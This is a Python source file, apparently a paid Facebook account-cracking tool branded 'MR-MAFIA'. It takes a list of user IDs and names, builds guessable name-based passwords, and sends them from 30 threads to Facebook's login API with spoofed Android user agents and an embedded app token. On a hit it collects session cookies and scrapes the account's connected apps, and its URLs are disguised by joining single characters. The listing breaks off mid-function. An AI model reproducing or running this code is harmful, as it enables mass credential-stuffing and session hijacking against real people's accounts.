import urllib3
"""
/_DEVELOPED BY ARAFAT_\
"""
import os
import sys
import time
import random
import uuid
import json
import base64
import requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import subprocess
import httpx
import importlib
def install_and_import(package):
    import urllib3
    try:
        importlib.import_module(package)
    except ImportError:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    finally:
        globals()[package] = importlib.import_module(package)

install_and_import('requests')
install_and_import('rich')
install_and_import('bs4')
install_and_import('httpx')
install_and_import('aiohttp')
install_and_import('asyncio')
install_and_import('psutil')

import hashlib
import importlib
import subprocess
from bs4 import BeautifulSoup as bs

#------------------[ PROXY SERVER ]-------------------#
try:
    proxylist = requests.get('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'r'+'a'+'w'+'.'+'g'+'i'+'t'+'h'+'u'+'b'+'u'+'s'+'e'+'r'+'c'+'o'+'n'+'t'+'e'+'n'+'t'+'.'+'c'+'o'+'m'+'/'+'M'+'A'+'F'+'I'+'A'+'-'+'1'+'4'+'3'+'/'+'M'+'R'+'-'+'M'+'A'+'F'+'I'+'A'+'/'+'r'+'e'+'f'+'s'+'/'+'h'+'e'+'a'+'d'+'s'+'/'+'m'+'a'+'i'+'n'+'/'+'s'+'o'+'c'+'k'+'s'+'4'+'.'+'t'+'x'+'t').text
    open('socksku.txt','w').write(proxylist)
except Exception as e:
    print(' server error')
proxsi = open('socksku.txt','r').read().splitlines()

#------------------[ Capture  ]-------------------#
sym = "\033[1;37m[\033[1;32mΠ\033[1;37m]\033[1;32m"
sym1 = "\033[1;37m[\033[1;32m1\033[1;37m]\033[1;32m"
sym2 = "\033[1;37m[\033[1;32m2\033[1;37m]\033[1;32m"
sym3 = "\033[1;37m[\033[1;32m3\033[1;37m]\033[1;32m"
sym4 = "\033[1;37m[\033[1;32m4\033[1;37m]\033[1;32m"
sym5 = "\033[1;37m[\033[1;32m5\033[1;37m]\033[1;32m"
symE = "\033[1;37m[\033[1;32mF\033[1;37m]\033[1;32m"

def capture(session, coki):
    try:
        urls = {
            "active": "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",
            "inactive": "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
        }

        for status, url in urls.items():
            response = session.get(url, cookies={'cookie': coki})
            response.raise_for_status()
            sop = BeautifulSoup(response.text, 'html.parser')
            form = sop.find('form', method='post')

            if form:
                games = form.find_all('h3')
                if games:
                    status_text = " \033[1;32m Your Active Apps " if status == "active" else " \033[1;32m Your Expired Apps "
                    color = "46m" if status == "active" else "196m"
                    print(f'\r\033[1;37m [√] \033[1;32m;{color} {status_text}:')
                    for i, game in enumerate(games, 1):
                        app_text = game.text.replace("Added on", " Added on") if status == "active" else game.text.replace("Expired", " Expired")
                        print(f'\r [{i}] {app_text}')
                else:
                    print(f'\r\033[1;37m [×] \x1b[1;31mSorry, no {status} apps found.')
            else:
                print(f'\r\033[1;37m [×] \x1b[1;31mCould not find {status} apps.')

        print('\033[1;37m------------------------------------------------')
    except Exception as e:
        print(f"Error: {e}")

def ARAFATx9_NET_ERROR():
    os.system("clear");print(logo)
    print(f"{sym} INTERNET CONNECTION ERROR")
    sys.exit(1)
    exit()
#------------------[ UA ]-------------------#
def UPR():
    ua1 = "[FBAN/FB4A;FBAV/339.0.0.32.118;FBBV/323006995;FBDM/{density=2.0,width=720,height=1369};FBLC/en_GB;FBRV/325030047;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    ua2 = "[FBAN/FB4A;FBAV/309.0.0.3.179;FBBV/482983480;FBDM/{density=3.5,width=1080,height=1491};FBLC/en_GB;FBRV/0;FBCR/TNT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    ua3 = "[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672900;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/0;FBCR/YOTA;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo Z90a40;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/en_GB;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    ua5 = "[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245028;FBDM/{density=3.0,width=1080,height=2090};FBLC/en_GB;FBRV/268119191;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaxx = random.choice([ua1, ua2, ua3, ua4, ua5])
    max = '[FBAN/FB4A;FBAV/' + str(random.randint(11,99)) + '.0.0.' + str(random.randint(1111,9999)) + ';FBBV/' + str(random.randint(1111111,9999999)) + ';' + f'{uaxx}'
    return max
import random

# Over 100+ popular and rare Android phone models
phone_models = [
    "SM-G991B", "SM-G996B", "SM-G998B", "SM-A125F", "SM-A325F", "SM-A525F", "SM-M315F",
    "SM-M515F", "SM-N975F", "SM-N986B", "SM-T865", "M2004J19C", "M2012K11AC", "M2101K9C",
    "M2101K6G", "M2011K2G", "Redmi Note 11", "Redmi Note 10 Pro", "Redmi 9A", "Redmi 8",
    "Redmi 10C", "Redmi Note 12", "Redmi K20", "Infinix X688C", "Infinix X682B", "Infinix X6511B",
    "Infinix Zero 8", "Infinix Note 12", "TECNO KE5", "TECNO CE9", "TECNO CD7", "TECNO POVA 3",
    "TECNO Camon 17", "Nokia 5.4", "Nokia 3.2", "Nokia 2.3", "Nokia G10", "Nokia X10",
    "Vivo Y20", "Vivo Y12", "Vivo V20", "Vivo Y33s", "Vivo Y15s", "Vivo Y51", "Vivo V21",
    "Oppo A15", "Oppo A54", "Oppo F17", "Oppo F19 Pro", "Oppo Reno5", "Oppo A5s", "Oppo A16",
    "Realme C11", "Realme C15", "Realme Narzo 30", "Realme 6", "Realme 8 Pro", "Realme GT",
    "Huawei Y7a", "Huawei Y9s", "Huawei P30 Lite", "Huawei Nova 7i", "Huawei Mate 30", 
    "Motorola G8 Power", "Motorola E7", "Motorola Edge", "Sony Xperia XZ1", "Sony Xperia 10 III",
    "Pixel 4", "Pixel 4a", "Pixel 5", "Pixel 6", "Pixel 7 Pro",
    "Asus ROG Phone 5", "Asus Zenfone Max Pro", "LG V60 ThinQ", "LG G8X", "LG K42",
    "HTC Desire 20", "Lenovo K10", "Lenovo Legion Phone Duel", "ZTE Axon 30", "ZTE Blade V2020",
    "Meizu 18", "Meizu M10", "OnePlus Nord", "OnePlus 9 Pro", "OnePlus 7T", "OnePlus 11",
    "Micromax IN 1", "Lava Z6", "Walton Primo GH10", "Walton Primo RX8", "Symphony Z60", "Symphony Z42"
]

def random_ua():
    android_version = f"Android {random.randint(4, 13)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    fb_version = f"{random.randint(10,500)}.0.0.{random.randint(10,99)}.{random.randint(1,200)}"
    fbbv = str(random.randint(10000000, 99999999))
    fbrv = str(random.randint(10000000, 99999999))
    fbsv = f"{random.uniform(4.0, 13.0):.1f}"
    density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
    width = random.randint(720, 1440)
    height = random.randint(1280, 2560)
    fblc = random.choice(["en_US", "en_GB", "fr_FR", "es_ES", "pt_BR", "de_DE", "it_IT", "ja_JP", "ko_KR", "ru_RU", "bn_BD", "ar_AE"])
    fbcr = random.choice(["Grameenphone", "Robi", "Banglalink", "Teletalk"])
    fbmf = random.choice(["Xiaomi", "Samsung", "Infinix", "TECNO", "Huawei", "Oppo", "Vivo", "OnePlus", "Realme", "Motorola", "Nokia", "LG"])
    fbdv = random.choice(phone_models)
    fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
    fbca = random.choice(["armeabi-v7a", "arm64-v8a", "x86", "x86_64"])
    
    ua = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbmf};FBDV/{fbdv};FBSV/{fbsv};FBCA/{fbca};FBRV/{fbrv};FBPN/{fbpn}]"
    return ua

import random
import random
def f4():
    huawei_models = [
        'Huawei P40', 'Huawei P40 Pro', 'Huawei P30', 'Huawei P30 Pro', 'Huawei Mate 30', 'Huawei Mate 30 Pro', 
        'Huawei Mate 20', 'Huawei Mate 20 Pro', 'Huawei Nova 5T', 'Huawei Nova 5i', 'Huawei Y9a', 'Huawei Y7a',
        'Huawei P20', 'Huawei P20 Pro', 'Huawei Mate 10', 'Huawei Mate 10 Pro', 'Huawei Honor 20', 'Huawei Honor 20 Pro',
        'Huawei Honor View 20', 'Huawei Honor 9X', 'Huawei Honor 8X', 'Huawei Enjoy 20', 'Huawei Enjoy 10', 'Huawei Y9s',
        'Huawei Y7s', 'Huawei P Smart 2020', 'Huawei P Smart 2021', 'Huawei Mate X', 'Huawei Mate Xs', 'Huawei P60 Pro',
        'Huawei Mate 40', 'Huawei Mate 40 Pro', 'Huawei P50', 'Huawei P50 Pro', 'Huawei Nova 9', 'Huawei Nova 9 SE'
    ]
    
    user_agent = f'[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};' \
                 f'FBBV/{random.randint(1111111, 9999999)};' \
                 f'FBDM={{density=2.0,width=1080,height=2400}};' \
                 f'FBLC/en_US;FBRV/{random.randint(111111111, 666666666)};' \
                 f'FBCR/Airalo;FBMF/Huawei;FBBD/Huawei;' \
                 f'FBPN/com.facebook.katana;FBDV/{random.choice(huawei_models)};' \
                 f'FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a;]'
    
    return user_agent
def m2():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/11.0.0.77.93;FBBV/61279955;FBDM/{density=2.7,width=1440,height=2560};FBLC/en_US;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920W8;FBSV/8.0;nullFBCA/armeabi-v7a:armeabi;]"
def ____useragent____():
    ____sexua____ = [
        "[FBAN/FB4A;FBAV/493.0.0.72.158;FBBV/457630896;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/Robi;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1941;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]",
        "[FBAN/FB4A;FBAV/503.0.0.69.76;FBBV/459620350;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/Banglalink;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3231;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    ]
    ____ua____ = f"[FBAN/FB4A;FBAV/{random.randint(11,99)}.0.0.{random.randint(1111,9999)};FBBV/{random.randint(1111111,9999999)};{random.choice(____sexua____)}"
    return ____ua____
def m4():
    facebook_version = f"{random.randint(100, 800)}.0.0.{random.randint(1, 99)}.{random.randint(10, 300)}"
    fbbv = str(random.randint(10000000, 99999999))
    fbrv = str(random.randint(0, 999999999))
    density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0', '3.5', '4.0', '4.5'])
    width = random.choice(["720", "1080", "1280", "1440", "1920", "2160", "2560", "3840", "5120", "7680"])
    height = random.choice(["720", "1080", "1280", "1440", "1920", "2560", "3840", "5120", "7680"])
    ver = random.choice(["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4.4.2", "5.1.1", "6.0.1", "9.0.1", "14", "15", "16", "17"]) 
    
    manufacturers = ['Samsung', 'Motorola', 'Huawei', 'Xiaomi', 'Asus', 'LG', 'Google', 'Sony', 'OnePlus', 'Nokia', 'Oppo', 'Vivo', 'Realme', 'Nothing', 'Infinix', 'Tecno', 'ZTE', 'Lenovo', 'Blackberry', 'Meizu']
    manufacturer = random.choice(manufacturers)
    
    models = {
        'Samsung': ['SM-G998B', 'SM-S908E', 'SM-T500', 'SM-N975U', 'SM-A536E', 'SM-G973U', 'SM-M536B', 'SM-A725F'],
        'Motorola': ['Moto G100', 'Moto Edge 40', 'Moto Razr 5G', 'Moto G Stylus 2023', 'Moto G82', 'Moto Z4'],
        'Huawei': ['Mate 50 Pro', 'P40 Pro+', 'nova Y90', 'Honor 50', 'Y9 Prime 2019', 'P30 Lite'],
        'Xiaomi': ['Mi 12', 'Redmi Note 11 Pro', 'Mi 11X', 'Poco F4', 'Mi Mix Fold', 'Redmi K50'],
        'Asus': ['ROG Phone 7', 'ZenFone 10', 'ROG Phone 5s', 'Zenfone 8 Flip', 'ROG Phone 3'],
        'LG': ['V70 ThinQ', 'Wing 5G', 'G7 One', 'K92 5G', 'V60 ThinQ', 'G8X ThinQ'],
        'Google': ['Pixel 7a', 'Pixel Fold', 'Pixel 6 Pro', 'Pixel 5', 'Pixel 4 XL', 'Pixel 3a'],
        'Sony': ['Xperia 1 IV', 'Xperia 5 III', 'Xperia 10 IV', 'Xperia Pro-I', 'Xperia XZ3'],
        'OnePlus': ['OnePlus 10 Pro', 'OnePlus 11R', 'OnePlus Nord CE 3', 'OnePlus 8T', 'OnePlus 9R'],
        'Nokia': ['G60 5G', 'X30 5G', 'C31', 'Nokia 9 PureView', 'Nokia 7.2'],
        'Oppo': ['Find X6 Pro', 'Reno 10', 'A98', 'Oppo A57', 'Reno 8'],
        'Vivo': ['X90 Pro+', 'V25 Pro', 'T2 5G', 'Vivo Y21', 'Vivo X70 Pro'],
        'Realme': ['GT 3', '11 Pro+', 'Narzo 60', 'Realme X7 Max', 'Realme 9 Pro+'],
        'Nothing': ['Phone (1)', 'Phone (2)'],
        'Infinix': ['Zero Ultra', 'Hot 12 Pro', 'Note 30 VIP', 'Infinix Zero X Pro'],
        'Tecno': ['Camon 20 Premier', 'Pova 5 Pro', 'Spark 10 Pro'],
        'ZTE': ['Axon 40 Ultra', 'Blade V50', 'ZTE Nubia RedMagic 8'],
        'Lenovo': ['Legion Phone Duel', 'K12 Pro', 'Lenovo Z6 Pro'],
        'Blackberry': ['Key2', 'Motion'],
        'Meizu': ['Meizu 18 Pro', 'Meizu 17']
    }
    
    model = random.choice(models[manufacturer])
    network_type = random.choice(['WiFi', 'LTE', '3G', '5G', 'HSPA+', '4G', 'EDGE', 'GPRS', 'NR', 'CDMA'])
    language_code = random.choice(['en_US', 'en_GB', 'es_ES', 'fr_FR', 'de_DE', 'it_IT', 'pt_BR', 'ru_RU', 'zh_CN', 'ja_JP', 'ko_KR', 'ar_AE', 'hi_IN', 'bn_BD'])
    hardware = random.choice(['arm64-v8a', 'armeabi-v7a', 'x86_64', 'armv7', 'mips64', 'x86', 'risc-v'])
    
    android_build_fingerprint = (
        f"{manufacturer}/{model}/{model}:"
        f"{ver}/{random.choice(['QKQ1', 'RKQ1', 'TP1A', 'RP1A', 'SP1A', 'UP1A'])}/{random.randint(100000, 999999)}:user/release-keys"
    )
    
    ua = (
        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/{language_code};FBRV/{fbrv};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};"
        f"FBPN/com.facebook.katana;FBDV/{model};FBSV/{ver};FBOP/1;FBCA/{hardware};FBDK/{android_build_fingerprint}]"
    )
    
    return ua


def generate_user_agent(manufacturer, model_list):
    facebook_version = f"{random.randint(200, 700)}.0.0.{random.randint(1, 99)}.{random.randint(10, 300)}"
    fbbv = str(random.randint(10000000, 99999999))
    fbrv = str(random.randint(0, 999999999))
    density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0', '3.5', '4.0'])
    width = random.choice(["720", "1080", "1280", "1440", "1920", "2160"])
    height = random.choice(["720", "1080", "1280", "1440", "1920", "2560"])
    ver = random.choice(["9", "10", "11", "12", "13", "14", "15"])
    model = random.choice(model_list)
    network_type = random.choice(['WiFi', 'LTE', '5G', '4G', 'EDGE'])
    language_code = random.choice(['en_US', 'bn_BD', 'hi_IN', 'fr_FR', 'pt_BR'])
    hardware = random.choice(['arm64-v8a', 'armeabi-v7a', 'x86_64'])

    fingerprint = f"{manufacturer}/{model}/{model}:{ver}/{random.choice(['RP1A', 'SP1A', 'TP1A'])}/{random.randint(100000, 999999)}:user/release-keys"

    ua = (
        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};"
        f"FBLC/{language_code};FBRV/{fbrv};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};"
        f"FBPN/com.facebook.katana;FBDV/{model};FBSV/{ver};FBOP/1;FBCA/{hardware};FBDK/{fingerprint}]"
    )

    return ua
#------------------[ LOGO ]-------------------#
logo = f"""\033[1;32m
MM    MM   AAA   FFFFFFF IIIII   AAA   
MMM  MMM  AAAAA  FF       III   AAAAA  
MM MM MM AA   AA FFFF     III  AA   AA 
MM    MM AAAAAAA FF       III  AAAAAAA 
MM    MM AA   AA FF      IIIII AA   AA 
\033[1;37m-----------------------------------------
{sym} AUTHOR   : MR-MAFIA 〤 ARAFAT HOSSEN
{sym} FACEBOOK : YOUCEF YT 〤 MD ARAFAT HOSSEN
{sym} GITHUB   : MAFIA-143
\033[1;37m-----------------------------------------
{sym} VERSION : !00
{sym} SERVICE : \033[;0m\033[1;93m
\033[1;37m-----------------------------------------"""
#------------------[ version ]-------------------#
try:
    #LMNx9_Security()
    version = requests.get('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'r'+'a'+'w'+'.'+'g'+'i'+'t'+'h'+'u'+'b'+'u'+'s'+'e'+'r'+'c'+'o'+'n'+'t'+'e'+'n'+'t'+'.'+'c'+'o'+'m'+'/'+'M'+'A'+'F'+'I'+'A'+'-'+'1'+'4'+'3'+'/'+'M'+'R'+'-'+'M'+'A'+'F'+'I'+'A'+'/'+'r'+'e'+'f'+'s'+'/'+'h'+'e'+'a'+'d'+'s'+'/'+'m'+'a'+'i'+'n'+'/'+'v'+'e'+'r'+'s'+'i'+'o'+'n'+'.'+'t'+'x'+'t').text
except:
    print('No Internet Connection')
    exit()
version = version.strip()
session = requests.Session()

#------------------[ COLORS ]-------------------#
P = '\x1b[1;97m'
M = '\033[1;33m'
H = '\033[1;32m'
K = '\x1b[1;97m'
B = '\x1b[1;96m'
U = '\x1b[1;95m'
O = '\x1b[1;97m'
R = '\x1b[38;5;246m'
N = '\x1b[0m'
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black = "\033[1;30m"
red = "\x1b[38;5;160m"
green = "\x1b[38;5;46m"
yelloww = "\033[1;33m"
blue = "\033[38;5;6m"
purple = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"

logo = f"""\033[1;32m
MM    MM   AAA   FFFFFFF IIIII   AAA   
MMM  MMM  AAAAA  FF       III   AAAAA  
MM MM MM AA   AA FFFF     III  AA   AA 
MM    MM AAAAAAA FF       III  AAAAAAA 
MM    MM AA   AA FF      IIIII AA   AA 
\033[1;37m-----------------------------------------
{sym} AUTHOR   : MR-MAFIA 〤 ARAFAT HOSSEN
{sym} FACEBOOK : YOUCEF YT 〤 MD ARAFAT HOSSEN
{sym} GITHUB   : MAFIA-143
\033[1;37m-----------------------------------------
{sym} VERSION : {version}
{sym} SERVICE : \033[;0mPAID\033[1;93m
\033[1;37m-----------------------------------------"""

def linex():
    print('\033[1;37m-----------------------------------------')

def clear():
    os.system('clear')
    print(logo)

#------------------[ system  ]-------------------#
loop = 0
lim = 0
tp = 0
oks = []
cps = []
pcp = []
id = []
plist = []
methods = []
speed = []
twf = []

#------------------[ SIM CODE  ]-------------------#
try:
    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
    carrier = output.replace(',', '\033[1;37m|\033[1;37m').replace('\n', '')
except Exception as e:
    carrier = None

#------------------[ MENU MAFIA  ]-------------------#
def menu():
    #LMNx9_Security()
    clear()
    print('\033[1;37m[\033[1;31m1\033[1;37m]\033[1;32m CRACK FILE ')
    print('\033[1;37m[\033[1;31m2\033[1;37m]\033[1;32m WHATSAPP GROUP')
    print('\033[1;37m[\033[1;31m3\033[1;37m]\033[1;32m FOLLOW FB')
    print('\033[1;37m[\033[1;31m0\033[1;37m]\033[1;32m EXIT ')
    linex()
    xd = input(f'{sym} CHOOSE : ')
    
    if xd in ['1','01']:
        clear()
        print(f'{sym} FILE EXAMPLE : /sdcard/mafia.txt')
        linex()
        file = input(f'{sym} ENTER FILE PATH\033[1;32m : ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print(f'{sym} FILE LOCATION NOT FOUND ')
            time.sleep(1)
            menu()
        
        clear()
        print(f'{sym} TRY METHOD 2 & 3 FOR BEST RESULTS ')
        linex()
        print('\033[1;37m[\033[1;31m1\033[1;37m]\033[1;32m METHOD / \033[1;31mUPDTED MIX IDS \033[1;31m + Capture ')
        print('\033[1;37m[\033[1;31m2\033[1;37m]\033[1;32m METHOD / \033[1;31mUPDTED MIX IDS ')
        print('\033[1;37m[\033[1;31m3\033[1;37m]\033[1;32m METHOD / \033[1;31mUPDTED MIX IDS ')
        linex()
        mthd = input(f' {sym} CHOOSE : ')
        linex()
        plist = []
        clear()
        print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD ")                                
        print(" \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD ") 
        linex()
        psx = input(f' {sym} CHOOSE : ')
        
        if psx in ['1','01']:
            plist.append('first first')
            plist.append('first last')
            plist.append('last first')
            plist.append('last last')
            plist.append('firstfirst')     
            plist.append('firstlast')
            plist.append('lastfirst')
            plist.append('lastlast')
            plist.append("firstlast123")
            plist.append("firstlast1234")
            plist.append('firstlast12345')
            plist.append('first 123')
            plist.append('first 1234')
            plist.append('first 12345')
            plist.append('first12')
            plist.append('first123')
            plist.append('first1234')
            plist.append('first12345')
            plist.append('first123456')
            plist.append('first123456789')
            plist.append('first123123')
        else:
            try:
                linex()
                ps_limit = int(input(f' {sym} HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
            except:
                ps_limit = 1
            linex()
            print(f' {sym} EXAMPLE : first last,firtslast,first123')
            linex()
            for i in range(ps_limit):
                plist.append(input(f' {sym} PASSWORD {i+1}:\033[1;31m '))
        
        clear()
        print(f' {sym} DO YOU WENT SHOW CP ACCOUNT ? [Y/N] : ')
        linex()
        cx = input(f' {sym} CHOOSE : ')
        if cx in ['y','Y','yes','Yes','1']:
            pcp.append('y')
        else:
            pcp.append('n')
        
        with ThreadPoolExecutor(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(f" {sym} IF NO RESULT \033[1;33m[\033[1;31mON\033[1;33m/\033[1;31mOFF\033[1;33m] \033[1;32mAIRPLAN MODE ")
            carrier_display = carrier if carrier is not None else "Unknown"
            print(f' {sym} FILE NAME  \033[1;33m: \033[1;37m'+file+f' ')
            print(f' {sym} SIM NAME   \033[1;33m: \033[1;37m'+carrier_display+f' ')
            print(f' {sym} TOTAL UID  \033[1;33m| \033[1;32mMETHOD \033[1;33m: \033[1;37m'+total_ids+f'\033[1;33m >> \033[1;37mM'+mthd+f' ')
            linex()
            for user in fo:
                ids, names = user.split('|')
                passlist = plist
                if mthd in ['1','01']:
                    crack_submit.submit(M_file_1, ids, names, passlist) 
                elif mthd in ['2','02']:
                    crack_submit.submit(M_file_2, ids, names, passlist)
                elif mthd in ['3','03']:
                    crack_submit.submit(M_file_3, ids, names, passlist)
        
        print('\033[1;37m')
        linex()
        print(f'{sym} THE PROCESS COMPLETE')
        print(f'{sym} OK/CP : '+str(len(oks))+'/'+str(len(cps)))
        linex()
        input(f'{sym} PRESS ENTER TO BACK ')
        os.system('python MX3.py')
    
    elif xd in ['2','02']:                               
        #LMNx9_Security()
        os.system('xdg-open https://chat.whatsapp.com/LcGBrnPS2KC3b1p7GFJqa4')
    elif xd in ['3','03']:
        #LMNx9_Security()
        os.system('xdg-open https://www.facebook.com/mafiam1')
        menu() 
    elif xd in ['0','00']:
        exit(' Thanks for use ♥ ')
    else:
        exit(' Option not found in menu...')
#------------------[  METODE 1 ]-------------------#
def M_file_1(ids, names, passlist):
    try:
        global ok, loop
        boos = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;37m<[{boos}MR-MAFIA\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
        sys.stdout.flush()
        
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except IndexError:
            ln = fn
        
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            ua = "[FBAN/FB4A;FBAV/" + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ";FBBV/" + str(random.randint(11111111, 77777777)) + \
                 ";Dalvik/1.8.0(Linux; U; Android 7.0;Pixel 6 Pro Build/YCABFMVL)[FBAN/FB4A;FBAV/88.0.0.33.21FBBV/5169016FBDM/{density=3.0,width=636,height=1899}FBLC/fr_FRFBRV/2760568FBCR/T-MobileFBMF/GoogleFBBD/GoogleFBPN/com.facebook.katanaFBDV/Pixel 6 ProFBSV/7.0FBOP/1FBCA/x86:armeabi-v7a]" + \
                 "[FBAN/FB4A;FBAV/117.0.0.34.85FBBV/2390527FBDM/{density=3.0,width=817,height=1178}FBLC/en_USFBRV/6064105FBCR/VodafoneFBMF/SamsungFBBD/SamsungFBPN/com.facebook.katanaFBDV/SM-G973FFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]" + \
                 "[FBAN/FB4A;FBAV/117.0.0.34.85FBBV/2390527FBDM/{density=3.0,width=817,height=1178}FBLC/en_USFBRV/6064105FBCR/VodafoneFBMF/SamsungFBBD/SamsungFBPN/com.facebook.katanaFBDV/SM-G973FFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]" + \
                 "[FBAN/FB4A;FBAV/97.0.0.95.17FBBV/2499964FBDM/{density=3.0,width=644,height=1119}FBLC/pt_BRFBRV/9017165FBCR/AT&TFBMF/LGFBBD/LGFBPN/com.facebook.katanaFBDV/LM-G820FBSV/5.0FBOP/1FBCA/x86:armeabi-v7a]" + \
                 "[FBAN/FB4A;FBAV/104.0.0.92.95FBBV/9302531FBDM/{density=3.0,width=973,height=1873}FBLC/de_DEFBRV/9900840FBCR/Boost MobileFBMF/OPPOFBBD/OPPOFBPN/com.facebook.katanaFBDV/CPH2127FBSV/4.2.2FBOP/1FBCA/x86:armeabi-v7a]"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            data = {
                "kids_xudina": str(uuid.uuid4()),
                "format": "json",
                "kids_bokachoda": str(uuid.uuid4()),
                "FUCKED_BY_ARAFAT": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "locale":"fr_DZ",
                "client_country_code":"DZ",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
            }
            head = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "User-Agent": random_ua(),
                "X-FB-Net-HNI": "45204",
                "X-FB-SIM-HNI": "45201",
                "X-FB-Connection-Type": "unknown",
                "Connection": "Keep-Alive",
            }
            url = 'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'b'+'-'+'g'+'r'+'a'+'p'+'h'+'.'+'f'+'a'+'c'+'e'+'b'+'o'+'o'+'k'+'.'+'c'+'o'+'m'+'/'+'a'+'u'+'t'+'h'+'/'+'l'+'o'+'g'+'i'+'n'+'?'+'i'+'n'+'c'+'l'+'u'+'d'+'e'+'_'+'h'+'e'+'a'+'d'+'e'+'r'+'s'+'='+'f'+'a'+'l'+'s'+'e'+'&'+'d'+'e'+'c'+'o'+'d'+'e'+'_'+'b'+'o'+'d'+'y'+'_'+'j'+'s'+'o'+'n'+'='+'f'+'a'+'l'+'s'+'e'+'&'+'s'+'t'+'r'+'e'+'a'+'m'+'a'+'b'+'l'+'e'+'_'+'j'+'s'+'o'+'n'+'_'+'r'+'e'+'s'+'p'+'o'+'n'+'s'+'e'+'='+'t'+'r'+'u'+'e'
            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
            
            po = requests.post(url, data=data, headers=head, allow_redirects=False).text
            q = json.loads(po)
            
            if 'session_key' in q:
                coki = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                cookie = f"sb={ssbb};{coki}"
